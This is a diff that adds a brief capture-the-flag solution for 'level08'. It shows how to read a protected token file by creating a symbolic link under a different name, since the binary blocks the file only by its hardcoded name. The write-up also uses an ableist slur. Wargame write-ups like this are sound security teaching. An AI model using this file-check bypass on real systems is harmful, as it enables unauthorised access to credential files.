@@ -1,0 +1,10 @@
+An other ez one.
+
+The retarded binary has hardcoded the forbidden file instead of properly
+checking permissions. So just create a symbolic link with a different name:
+
+ln -s -T /home/user/level08/token /tmp/link
+
+And open it with the binary:
+
+./level08 /tmp/link
